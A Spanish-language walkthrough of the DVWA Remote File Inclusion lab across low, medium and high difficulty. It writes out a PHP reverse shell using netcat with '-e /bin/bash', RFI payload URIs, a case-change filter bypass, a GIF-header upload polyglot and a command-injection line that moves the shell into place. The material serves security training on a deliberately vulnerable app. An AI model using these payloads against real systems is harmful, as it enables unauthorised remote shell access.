# RFI

## Bajo

Para comenzar, podemos intentar lanzar un shell remoto escrito en PHP `php-reverse-shell.php` que se encuentra en nuestro servidor local y que previamente hemos creado con el siguiente contenido:

```php
<?php

$cmd = 'nc 127.0.0.1 4000 -e /bin/bash';
system($cmd);

?>
```

A continuación, ponemos en escucha el puerto 4000 en nuestro servidor local para recibir la conexión del servidor remoto:

```bash
nc -lvnp 4000
```

Una vez puesto en escucha, podemos intentar incluir el archivo `php-reverse-shell.php` en el servidor remoto a través de la siguiente URI:

```
http://localhost/DVWA/vulnerabilities/fi/?page=http://localhost/php-reverse-shell.php
```

Una vez incluido el archivo, el servidor remoto intentará conectarse al servidor local en el puerto 4000, y si todo ha ido bien, obtendremos una shell remota.
Una vez hayamos obtenida la shell remota, podemos intentar mejorar la TTY para poder interactuar con ella de una manera más cómoda, para ello ejecutamos el siguiente comando:

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

Una vez mejorada la TTY, podemos intentar leer el archivo `fi.php` utilizando cat:

```bash
cat DVWA/hackable/flags/fi.php
```

![rfi](/FI/assets/rfi.png)

## Medio

Al igual que en el nivel bajo, podemos intentar incluir el archivo `php-reverse-shell.php` en el servidor remoto a través de la siguiente URI:

```
http://localhost/DVWA/vulnerabilities/fi/?page=http://localhost/php-reverse-shell.php
```

Si probamos a ejecutarlo, comprobaremos que no funciona debido a que el servidor habra reemplazado el `http://` por una cadena vacía y por tanto no podrá conectarse al servidor local. Para poder solucionar esto, podemos probar cambiando `http` -> `Http` | `httphttp` | `HTTP` | etc.

```
http://localhost/DVWA/vulnerabilities/fi/?page=Http://localhost/php-reverse-shell.php
```

![rfi-2](/FI/assets/rfi-2.png)

Como se puede ver, se ha vuelto a visualizar el archivo `fi.php` de donde extraemos todas las citas.

## Alto

Al contrario que en los niveles anteriores, ahora para subir la reverse shell al servidor remoto debemos hacerlo aprovechando otra vulnerabilidad, en este caso la vulnerabilidad de **subida de archivos** o **file upload**. Para ello, podemos utilizar el script utilizado en la sección de file upload:

```php
GIF98
<?php

$cmd = 'nc 127.0.0.1 4000 -e /bin/bash';
system($cmd);

?>
```

Como se menciona en la otra sección se puede ver que se consigue subir el archivo `shell.png` a través de la siguiente URI:
![uploaded-high](/FU/assets/upload-high.png)

Una vez subido, procedemos a cambiar el nombre del archivo a `shell.php` y a moverlo a la carpeta `fi` mediante la técnica de Command Injection:

```bash
|mv ../../hackable/uploads/shell.png ../fi/file5.php
```

Una vez movido, podemos intentar incluir el archivo `file5.php` en el servidor remoto a través de la siguiente URI:

```
http://localhost/DVWA/vulnerabilities/fi/?page=file5.php
```

![challenge-4](/FI/assets/challenge-4.png)